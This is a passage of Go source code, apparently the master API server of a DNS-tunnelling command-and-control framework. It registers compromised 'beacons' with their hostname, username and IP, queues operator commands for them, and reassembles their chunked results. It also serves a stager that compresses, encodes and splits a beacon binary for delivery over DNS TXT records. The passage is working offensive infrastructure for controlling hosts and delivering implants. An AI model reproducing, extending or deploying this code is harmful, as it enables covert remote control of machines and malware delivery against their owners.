		fmt.Printf("[API]    FirstSeen: %v, LastSeen: %v\n", req.Beacon.FirstSeen, req.Beacon.LastSeen)
	}

	// Store beacon in master database (upsert for updates)
	err := api.db.UpsertBeacon(
		req.Beacon.ID,
		req.Beacon.Hostname,
		req.Beacon.Username,
		req.Beacon.OS,
		req.Beacon.Arch,
		req.Beacon.IPAddress,
		dnsServerID,
		req.Beacon.FirstSeen,
		req.Beacon.LastSeen,
	)

	if err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Error storing beacon: %v\n", err)
		}
		api.sendError(w, http.StatusInternalServerError, "failed to register beacon")
		return
	}

	// Record that this beacon contacted this DNS server
	// Get the DNS domain for this server
	servers, err := api.db.GetDNSServers()
	dnsDomain := "unknown"
	if err == nil {
		for _, server := range servers {
			if serverID, ok := server["id"].(string); ok && serverID == dnsServerID {
				if domain, ok := server["domain"].(string); ok {
					dnsDomain = domain
					break
				}
			}
		}
	}

	// Track beacon DNS contact (async, don't fail the response if this errors)
	go func(beaconID, serverID, domain string) {
		if err := api.db.RecordBeaconDNSContact(beaconID, serverID, domain); err != nil {
			if api.config.Debug {
				fmt.Printf("[API] ⚠️  Failed to record beacon DNS contact: %v\n", err)
			}
		}
	}(req.Beacon.ID, dnsServerID, dnsDomain)

	if api.config.Debug {
		fmt.Printf("[API] ✅ Beacon %s stored successfully from DNS server %s\n",
			req.Beacon.ID, dnsServerID)
	}

	api.sendSuccess(w, "beacon registered", map[string]interface{}{
		"beacon_id":     req.Beacon.ID,
		"dns_server_id": dnsServerID,
	})
}

// handleListBeacons returns all beacons across all DNS servers
func (api *APIServer) handleListBeacons(w http.ResponseWriter, r *http.Request) {
	// Parse pagination parameters
	limit := 50 // default page size
	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 500 {
			limit = l
		}
	}

	offset := 0
	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
			offset = o
		}
	}

	// Get paginated beacons (active within last 30 minutes)
	beacons, err := api.db.GetActiveBeaconsPaginated(30, limit, offset)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
		return
	}

	// Get total count for pagination metadata
	total, err := api.db.CountActiveBeacons(30)
	if err != nil {
		// Log error but continue with partial response
		if api.config.Debug {
			fmt.Printf("[API] Warning: Failed to count beacons: %v\n", err)
		}
		total = len(beacons) // fallback to current page size
	}

	api.sendJSON(w, map[string]interface{}{
		"beacons": beacons,
		"pagination": map[string]interface{}{
			"total":  total,
			"limit":  limit,
			"offset": offset,
			"count":  len(beacons),
		},
	})
}

// handleGetBeacon returns details for a specific beacon
func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	if api.config.Debug {
		fmt.Printf("[API] Beacon details requested: %s\n", beaconID)
	}

	beacon, err := api.db.GetBeacon(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
		return
	}

	if beacon == nil {
		api.sendError(w, http.StatusNotFound, "beacon not found")
		return
	}

	api.sendJSON(w, beacon)
}

// handleGetBeaconDNSContacts returns DNS contact history for a beacon
func (api *APIServer) handleGetBeaconDNSContacts(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	if api.config.Debug {
		fmt.Printf("[API] Beacon DNS contacts requested: %s\n", beaconID)
	}

	contacts, err := api.db.GetBeaconDNSContacts(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS contacts")
		return
	}

	api.sendJSON(w, contacts)
}

// Task Management Endpoints

// handleCreateTask creates a new task for a beacon
func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	var req TaskCreateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")

	// Create task in database
	taskID, err := api.db.CreateTask(req.BeaconID, req.Command, operatorID)
	if err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Failed to create task: %v\n", err)
		}
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create task: %v", err))
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] ✅ Task %s created by %s: '%s' for beacon %s\n",
			taskID, username, req.Command, req.BeaconID)
	}

	// Log task creation
	api.db.LogAuditEvent(operatorID, "task_create", "task", taskID,
		fmt.Sprintf("Created task for beacon %s: %s", req.BeaconID, req.Command), r.RemoteAddr)

	api.sendSuccess(w, "task created", map[string]interface{}{
		"task_id":   taskID,
		"beacon_id": req.BeaconID,
		"command":   req.Command,
		"status":    "pending",
	})
}

// handleListTasks returns all tasks
func (api *APIServer) handleListTasks(w http.ResponseWriter, r *http.Request) {
	// Parse pagination parameters
	limit := 100 // default page size
	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 1000 {
			limit = l
		}
	}

	offset := 0
	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
			offset = o
		}
	}

	// Get paginated tasks
	tasks, err := api.db.GetAllTasksPaginated(limit, offset)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
		return
	}

	// Get total count for pagination metadata
	total, err := api.db.CountAllTasks()
	if err != nil {
		// Log error but continue with partial response
		if api.config.Debug {
			fmt.Printf("[API] Warning: Failed to count tasks: %v\n", err)
		}
		total = len(tasks) // fallback to current page size
	}

	api.sendJSON(w, map[string]interface{}{
		"tasks": tasks,
		"pagination": map[string]interface{}{
			"total":  total,
			"limit":  limit,
			"offset": offset,
			"count":  len(tasks),
		},
	})
}

// handleGetTask returns details for a specific task
func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	task, err := api.db.GetTaskWithResult(taskID)
	if err != nil {
		if err.Error() == "task not found" {
			api.sendError(w, http.StatusNotFound, "task not found")
		} else {
			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task["status"])
	}

	api.sendJSON(w, task)
}

// handleGetTaskStatus returns the current status of a task
func (api *APIServer) handleGetTaskStatus(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	// Get task from database (lightweight query, no result data)
	task, err := api.db.GetTaskWithResult(taskID)
	if err != nil {
		if err.Error() == "task not found" {
			api.sendError(w, http.StatusNotFound, "task not found")
		} else {
			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
		}
		return
	}

	// Return just the status
	api.sendJSON(w, map[string]interface{}{
		"status": task["status"],
	})
}

// handleGetTaskResult returns the result for a specific task
func (api *APIServer) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	// Get the complete result (must acquire lock since GetTaskResult doesn't)
	api.db.mutex.RLock()
	resultData, isComplete, err := api.db.GetTaskResult(taskID)
	api.db.mutex.RUnlock()

	if err != nil {
		if err.Error() == "no result found" {
			api.sendError(w, http.StatusNotFound, "result not found")
		} else {
			api.sendError(w, http.StatusInternalServerError, "failed to retrieve result")
		}
		return
	}

	if !isComplete {
		// Partial result - return progress
		received, total, _ := api.db.GetTaskResultProgress(taskID)
		api.sendJSON(w, map[string]interface{}{
			"task_id":      taskID,
			"is_complete":  false,
			"progress":     fmt.Sprintf("%d/%d chunks", received, total),
			"received":     received,
			"total_chunks": total,
		})
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Task result retrieved: %s (%d bytes)\n", taskID, len(resultData))
	}

	// Complete result
	api.sendJSON(w, map[string]interface{}{
		"task_id":     taskID,
		"is_complete": true,
		"result":      resultData,
		"size":        len(resultData),
	})
}

// handleGetTasksForDNSServer returns pending tasks for a specific DNS server
func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	tasks, err := api.db.GetTasksForDNSServer(dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
		return
	}

	// Mark tasks as 'sent' to prevent duplicate polling
	if len(tasks) > 0 {
		taskIDs := make([]string, len(tasks))
		for i, task := range tasks {
			taskIDs[i] = task["id"].(string)
		}

		if err := api.db.MarkTasksSent(taskIDs); err != nil && api.config.Debug {
			fmt.Printf("[API] Warning: Failed to mark tasks as sent: %v\n", err)
		}
	}

	if api.config.Debug && len(tasks) > 0 {
		fmt.Printf("[API] Returning %d task(s) to DNS server %s\n", len(tasks), dnsServerID)
	}

	// Return tasks array directly (not wrapped in object)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

// handleGetBeaconsForDNSServer returns all active beacons (for cross-server awareness)
// This allows DNS servers to know about beacons registered on other servers
func (api *APIServer) handleGetBeaconsForDNSServer(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Get all active beacons from master (active = seen in last 10 minutes)
	beacons, err := api.db.GetActiveBeacons(10)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Beacon list requested by DNS server %s: %d active beacons\n",
			dnsServerID, len(beacons))
	}

	api.sendJSON(w, beacons)
}

// handleDNSServerRegistration handles DNS server registration/heartbeat
// Returns the list of all active DNS domains for the server to use
func (api *APIServer) handleDNSServerRegistration(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ServerID string `json:"server_id"`
		Domain   string `json:"domain"`
		Address  string `json:"address"`
		APIKey   string `json:"api_key"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate required fields
	if req.ServerID == "" || req.Domain == "" || req.APIKey == "" {
		api.sendError(w, http.StatusBadRequest, "missing required fields: server_id, domain, api_key")
		return
	}

	// Verify API key matches (auth middleware may have bypassed for first registration)
	dnsServerID := r.Header.Get("X-DNS-Server-ID")
	if dnsServerID != req.ServerID {
		api.sendError(w, http.StatusUnauthorized, "server_id mismatch")
		return
	}

	// Check if this is an existing DNS server (re-registration) or new registration
	existingValid, err := api.db.VerifyDNSServerAPIKey(req.ServerID, req.APIKey)
	if err == nil && existingValid {
		// Server exists and API key is valid - this is a re-registration (e.g., server restart)
		// Update the record
		if api.config.Debug {
			fmt.Printf("[API] DNS server re-registration: %s (%s)\n", req.ServerID, req.Domain)
		}
	} else {
		// Either server doesn't exist or API key is invalid
		// This should be a first-time registration from a built binary
		// The builder should have already created the record, so verify the API key matches
		// what was embedded in the binary at build time
		if api.config.Debug {
			fmt.Printf("[API] DNS server first-time registration: %s (%s)\n", req.ServerID, req.Domain)
		}
	}

	// Update or insert DNS server record
	err = api.db.RegisterDNSServer(req.ServerID, req.Domain, req.Address, req.APIKey)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to register DNS server")
		if api.config.Debug {
			fmt.Printf("[API] DNS server registration error: %v\n", err)
		}
		return
	}

	// Get all active DNS domains to return
	servers, err := api.db.GetActiveDNSServers()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
		return
	}

	// Extract domain list
	domains := make([]string, 0, len(servers))
	for _, server := range servers {
		if domain, ok := server["domain"].(string); ok && domain != "" {
			domains = append(domains, domain)
		}
	}

	if api.config.Debug {
		fmt.Printf("[API] DNS server registered: %s (%s) - returning %d active domains\n",
			req.ServerID, req.Domain, len(domains))
	}

	api.sendSuccess(w, "DNS server registered", map[string]interface{}{
		"server_id": req.ServerID,
		"domain":    req.Domain,
		"domains":   domains,
	})
}

// handleGetTaskStatusesForDNSServer returns completed/failed task statuses for DNS servers
// This allows DNS servers to clear beacon.CurrentTask when Master completes task reassembly
func (api *APIServer) handleGetTaskStatusesForDNSServer(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Get tasks with completed/failed/partial status that haven't been synced yet
	tasks, err := api.db.GetCompletedTasksForSync(dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve task statuses")
		return
	}

	if api.config.Debug && len(tasks) > 0 {
		fmt.Printf("[API] Returning %d completed task status(es) to DNS server %s\n", len(tasks), dnsServerID)
	}

	// Mark these tasks as synced to avoid sending them again
	if len(tasks) > 0 {
		taskIDs := make([]string, len(tasks))
		for i, task := range tasks {
			taskIDs[i] = task["id"].(string)
		}
		// Mark as synced (fire and forget - don't fail the response if this errors)
		go api.db.MarkTasksAsSynced(taskIDs)
	}

	// Return tasks array directly (not wrapped in object)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

// handleMarkTaskDelivered marks a task as delivered by a DNS server
// This is called when a DNS server delivers a task to a beacon (atomically claims it)
func (api *APIServer) handleMarkTaskDelivered(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	var req struct {
		TaskID string `json:"task_id"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if req.TaskID == "" {
		api.sendError(w, http.StatusBadRequest, "task_id is required")
		return
	}

	// Atomically mark task as delivered
	claimed, err := api.db.MarkTaskDelivered(req.TaskID, dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to mark task as delivered")
		if api.config.Debug {
			fmt.Printf("[API] Error marking task delivered: %v\n", err)
		}
		return
	}

	if api.config.Debug {
		if claimed {
			fmt.Printf("[API] Task %s delivered by DNS server %s\n", req.TaskID, dnsServerID)
		} else {
			fmt.Printf("[API] Task %s already delivered by another DNS server\n", req.TaskID)
		}
	}

	api.sendSuccess(w, "task marked as delivered", map[string]interface{}{
		"task_id": req.TaskID,
		"claimed": claimed,
	})
}

// handleSubmitResult processes a task result from a DNS server
// Handles both single-chunk and multi-chunk results from distributed DNS servers
func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
	var req ResultSubmitRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Store the result chunk in master database
	err := api.db.SaveResultChunk(
		req.TaskID,
		req.BeaconID,
		dnsServerID,
		req.ChunkIndex,
		req.TotalChunks,
		req.Data,
	)

	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to store result chunk")
		if api.config.Debug {
			fmt.Printf("[API] Error storing result chunk: %v\n", err)
		}
		return
	}

	// Check if task is now complete after saving this chunk
	// For multi-chunk results, only report complete if assembled result is actually available
	taskComplete := false
	task, err := api.db.GetTaskWithResult(req.TaskID)
	if err == nil {
		if status, ok := task["status"].(string); ok {
			if status == "completed" {
				// Verify result is actually present (not just status change)
				// This prevents race condition where status="completed" but reassembly not yet finished
				if _, hasResult := task["result"]; hasResult {
					taskComplete = true
				} else if req.TotalChunks == 1 {
					// Single-chunk results should have result immediately
					taskComplete = true
				}
				// If no result yet, don't report complete (async reassembly still running)
			} else if status == "failed" {
				taskComplete = true
			}
		}
	}

	if api.config.Debug {
		if req.TotalChunks == 1 {
			fmt.Printf("[API] Complete result from DNS server %s: Task %s (%d bytes) [task_complete=%v]\n",
				dnsServerID, req.TaskID, len(req.Data), taskComplete)
		} else {
			// Check progress for multi-chunk results
			received, total, _ := api.db.GetTaskResultProgress(req.TaskID)
			fmt.Printf("[API] Result chunk from DNS server %s: Task %s, chunk %d/%d (progress: %d/%d) [task_complete=%v]\n",
				dnsServerID, req.TaskID, req.ChunkIndex, req.TotalChunks, received, total, taskComplete)
		}
	}

	api.sendSuccess(w, "result recorded", map[string]interface{}{
		"task_id":       req.TaskID,
		"chunk_index":   req.ChunkIndex,
		"total_chunks":  req.TotalChunks,
		"task_complete": taskComplete,
	})
}

// handleSubmitProgress processes task progress updates from DNS servers
func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
	var req TaskProgressRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Update task progress in database
	err := api.db.UpdateTaskProgress(
		req.TaskID,
		req.BeaconID,
		dnsServerID,
		req.ReceivedChunks,
		req.TotalChunks,
		req.Status,
	)

	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update progress")
		if api.config.Debug {
			fmt.Printf("[API] Error updating progress: %v\n", err)
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Progress update from %s: Task %s - %d/%d chunks (%s)\n",
			dnsServerID, req.TaskID, req.ReceivedChunks, req.TotalChunks, req.Status)
	}

	api.sendSuccess(w, "progress updated", nil)
}

// handleGetTaskProgress returns progress information for a specific task
func (api *APIServer) handleGetTaskProgress(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	// Use the results-based progress calculation for accurate operator view
	api.db.mutex.RLock()
	progress, err := api.db.GetTaskProgressFromResults(taskID)
	api.db.mutex.RUnlock()

	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve progress")
		return
	}

	api.sendJSON(w, progress)
}

// handleDeleteTask deletes a task (for canceling pending tasks or cleanup)
func (api *APIServer) handleDeleteTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")

	// Delete the task
	if err := api.db.DeleteTask(taskID); err != nil {
		if err.Error() == "task not found" {
			api.sendError(w, http.StatusNotFound, "task not found")
		} else {
			if api.config.Debug {
				fmt.Printf("[API] ❌ Failed to delete task %s: %v\n", taskID, err)
			}
			api.sendError(w, http.StatusInternalServerError, "failed to delete task")
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Task %s deleted by %s\n", taskID, username)
	}

	// Log audit event
	api.db.LogAuditEvent(operatorID, "task_delete", "task", taskID,
		fmt.Sprintf("Deleted task %s", taskID), r.RemoteAddr)

	api.sendSuccess(w, "task deleted", map[string]interface{}{
		"task_id": taskID,
	})
}

// handleDeleteBeacon deletes a beacon and all its associated tasks/results
func (api *APIServer) handleDeleteBeacon(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")

	// Delete the beacon
	if err := api.db.DeleteBeacon(beaconID); err != nil {
		if err.Error() == "beacon not found" {
			api.sendError(w, http.StatusNotFound, "beacon not found")
		} else {
			if api.config.Debug {
				fmt.Printf("[API] ❌ Failed to delete beacon %s: %v\n", beaconID, err)
			}
			api.sendError(w, http.StatusInternalServerError, "failed to delete beacon")
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Beacon %s deleted by %s\n", beaconID, username)
	}

	// Log audit event
	api.db.LogAuditEvent(operatorID, "beacon_delete", "beacon", beaconID,
		fmt.Sprintf("Deleted beacon %s and all associated tasks", beaconID), r.RemoteAddr)

	api.sendSuccess(w, "beacon deleted", map[string]interface{}{
		"beacon_id": beaconID,
	})
}

// handleStats returns master server statistics
func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
	stats, err := api.db.GetDatabaseStats()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stats")
		return
	}

	api.sendJSON(w, stats)
}

// Stager Management Handlers

// handleListClientBinaries returns all stored client binaries from the database
func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Request) {
	// Query client binaries from database (where they're stored with chunks)
	binaries, err := api.db.GetClientBinaries()
	if err != nil {
		fmt.Printf("[API] Error querying client binaries from database: %v\n", err)
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve client binaries")
		return
	}

	fmt.Printf("[API] Returning %d client binaries from database\n", len(binaries))

	if len(binaries) == 0 {
		binaries = []map[string]interface{}{} // Return empty array instead of null
	}

	api.sendJSON(w, binaries)
}

// handleListStagerSessions returns all stager deployment sessions
func (api *APIServer) handleListStagerSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.GetStagerSessions(100) // Last 100 sessions
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stager sessions")
		return
	}

	api.sendJSON(w, sessions)
}

// handleGetStagerSession returns details of a specific stager session
func (api *APIServer) handleGetStagerSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	session, err := api.db.GetStagerSession(sessionID)
	if err != nil {
		api.sendError(w, http.StatusNotFound, "stager session not found")
		return
	}

	api.sendJSON(w, session)
}

// Stager Protocol Handlers (called by DNS servers)

// StagerInitRequest represents a stager initialization request from DNS server
type StagerInitRequest struct {
	StagerIP    string `json:"stager_ip"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	DNSServerID string `json:"dns_server_id"`
}

// StagerInitResponse contains session info and chunk assignments
type StagerInitResponse struct {
	SessionID      string   `json:"session_id"`
	TotalChunks    int      `json:"total_chunks"`
	DNSDomains     []string `json:"dns_domains"`
	ChunkSize      int      `json:"chunk_size"`
	SHA256Checksum string   `json:"sha256_checksum"` // Hex-encoded SHA256 of original binary for verification
}

// loadAndProcessClientBinary loads a client binary from disk and processes it for stager deployment
// Automatically finds the most recent beacon for the given OS/Arch from builds directory
// Returns: clientBinaryID, base64Data, totalChunks, sha256Checksum, error
func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, string, error) {
	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds/client)
	dbDir := filepath.Dir(api.config.DatabasePath)
	buildsDir := filepath.Join(dbDir, "builds", "client")

	// Determine what we're looking for
	var clientFilename string
	if strings.ToLower(osType) == "windows" {
		clientFilename = "beacon-windows"
	} else {
		clientFilename = "beacon-linux"
	}

	// Find all matching beacon files
	files, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
	if err != nil {
		return "", "", 0, "", fmt.Errorf("failed to search builds directory: %w", err)
	}

	if len(files) == 0 {
		return "", "", 0, "", fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, buildsDir)
	}

	// Use the most recent file (last in sorted list)
	clientPath := files[len(files)-1]
	beaconID := filepath.Base(clientPath)

	fmt.Printf("[Master] Loading client binary: %s\n", clientPath)

	// Read client binary
	clientData, err := os.ReadFile(clientPath)
	if err != nil {
		return "", "", 0, "", fmt.Errorf("failed to read client binary: %w", err)
	}

	fmt.Printf("[Master] Loaded client binary: %d bytes\n", len(clientData))

	// Calculate SHA256 checksum of original binary for verification
	checksumBytes := sha256.Sum256(clientData)
	checksum := hex.EncodeToString(checksumBytes[:])
	fmt.Printf("[Master] SHA256 checksum: %s\n", checksum)

	// Compress with gzip
	var compressedBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&compressedBuf)
	_, err = gzWriter.Write(clientData)
	if err != nil {
		return "", "", 0, "", fmt.Errorf("failed to compress client: %w", err)
	}
	gzWriter.Close()

	compressed := compressedBuf.Bytes()
	fmt.Printf("[Master] Compressed: %d bytes -> %d bytes (%.1f%% reduction)\n",
		len(clientData), len(compressed),
		100.0*(1.0-float64(len(compressed))/float64(len(clientData))))

	// Base64 encode
	base64Data := base64.StdEncoding.EncodeToString(compressed)
	fmt.Printf("[Master] Base64 encoded: %d bytes\n", len(base64Data))

	// Calculate total chunks
	// DNS UDP limit: 512 bytes - headers (~125 bytes) - "CHUNK|" (6 bytes) - TXT overhead (~10 bytes) = ~370 bytes safe
	const chunkSize = 370
	totalChunks := (len(base64Data) + chunkSize - 1) / chunkSize

	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)

	// Get active DNS domains for the client_binaries record
	dnsServers, err := api.db.GetDNSServers()
	var dnsDomains []string
	if err == nil {
		for _, server := range dnsServers {
			if status, ok := server["status"].(string); ok && status == "active" {
				if domain, ok := server["domain"].(string); ok {
					dnsDomains = append(dnsDomains, domain)
				}
			}
		}
	}
	dnsDomainsStr := strings.Join(dnsDomains, ",")

	// Ensure this beacon exists in client_binaries table (needed for foreign key constraint)
	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch,
		len(clientData), len(compressed), len(base64Data), totalChunks, base64Data, dnsDomainsStr, checksum)
	if err != nil {
		return "", "", 0, "", fmt.Errorf("failed to register client binary in database: %w", err)
	}

	return beaconID, base64Data, totalChunks, checksum, nil
} // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
	var req StagerInitRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")
	if dnsServerID == "" {
		dnsServerID = req.DNSServerID
	}

	if api.config.Debug {
		fmt.Printf("[API] Stager init request: %s (%s/%s) via DNS server %s\n",
			req.StagerIP, req.OS, req.Arch, dnsServerID)
	}

	// Load and process client binary from filesystem
	clientBinaryID, base64Data, totalChunks, sha256Checksum, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
	if err != nil {
		// Always log this error - critical for troubleshooting
		fmt.Printf("[API] Failed to load client binary for %s/%s: %v\n", req.OS, req.Arch, err)
		api.sendError(w, http.StatusNotFound, fmt.Sprintf("failed to load client binary: %v", err))
		return
	}

	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, sha256Checksum[:16])

	// Create stager session (4-char random ID to keep DNS packets under 512 bytes)
	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))

	err = api.db.CreateStagerSession(
		sessionID,
		req.StagerIP,
		req.OS,
		req.Arch,
		clientBinaryID,
		dnsServerID,
		totalChunks,
	)

	if err != nil {
		// Always log this error (not just in debug mode) - critical for troubleshooting
		fmt.Printf("[API] ❌ Failed to create stager session: %v\n", err)
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create stager session: %v", err))
		return
	}

	// Get active DNS servers for distribution
	dnsServers, err := api.db.GetDNSServers()
	if err != nil || len(dnsServers) == 0 {
		api.sendError(w, http.StatusInternalServerError, "no DNS servers available")
		return
	}

	// Extract DNS server IDs and domains
	var dnsServerIDs []string
	var dnsDomains []string
	for _, server := range dnsServers {
		if server["status"].(string) == "active" {
			dnsServerIDs = append(dnsServerIDs, server["id"].(string))
			dnsDomains = append(dnsDomains, server["domain"].(string))
		}
	}

	if len(dnsServerIDs) == 0 {
		api.sendError(w, http.StatusInternalServerError, "no active DNS servers")
		return
	}

	// Split base64 data into chunks
	// DNS UDP limit: 512 bytes - headers (~125 bytes) - "CHUNK|" (6 bytes) - TXT overhead (~10 bytes) = ~370 bytes safe
	const chunkSize = 370
	var chunks []string
	for i := 0; i < len(base64Data); i += chunkSize {
		end := i + chunkSize
		if end > len(base64Data) {
			end = len(base64Data)
		}
		chunks = append(chunks, base64Data[i:end])
	}

	// Assign chunks to DNS servers (round-robin)
	err = api.db.AssignStagerChunks(sessionID, clientBinaryID, chunks, dnsServerIDs)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to assign chunks")
		if api.config.Debug {
			fmt.Printf("[API] Failed to assign chunks: %v\n", err)
		}
		return
	}

	// Queue cache task for all DNS servers (they'll get it on next checkin)
	err = api.db.QueueStagerCacheForDNSServers(clientBinaryID, dnsServerIDs)
	if err != nil {
		// Log but don't fail - stager will still work via on-demand caching
		fmt.Printf("[API] Failed to queue cache tasks: %v\n", err)
	} else {
		fmt.Printf("[API] Queued stager cache for %d DNS servers\n", len(dnsServerIDs))
	}

	// Always log stager session creation (not just in debug mode)
	fmt.Printf("[API] Stager session created: %s | Stager: %s (%s/%s) | Chunks: %d across %d DNS servers\n",
		sessionID[:16], req.StagerIP, req.OS, req.Arch, totalChunks, len(dnsServerIDs))

	if api.config.Debug {
		fmt.Printf("[API] DNS domains available: %v\n", dnsDomains)
	}

	// Return simple session info (domains are compiled into stager now)
	response := StagerInitResponse{
		SessionID:      sessionID,
		TotalChunks:    totalChunks,
		DNSDomains:     nil,            // Not needed - stager has domains compiled in
		ChunkSize:      370,            // DNS-safe chunk size
		SHA256Checksum: sha256Checksum, // For binary signature verification
	}

	api.sendJSON(w, response)
}

// StagerChunkRequest represents a chunk request from DNS server
type StagerChunkRequest struct {
	SessionID  string `json:"session_id"`
	ChunkIndex int    `json:"chunk_index"`
	StagerIP   string `json:"stager_ip"`
}

// StagerChunkResponse contains chunk data
type StagerChunkResponse struct {
	ChunkIndex int    `json:"chunk_index"`
	ChunkData  string `json:"chunk_data"`
	Success    bool   `json:"success"`
	Message    string `json:"message,omitempty"`
}

// handleStagerChunk processes chunk requests (ACK message forwarded from DNS server)
func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) {
	var req StagerChunkRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Get chunk from database
	chunkData, assignedDNS, err := api.db.GetStagerChunk(req.SessionID, req.ChunkIndex)
	if err != nil {
		api.sendJSON(w, StagerChunkResponse{
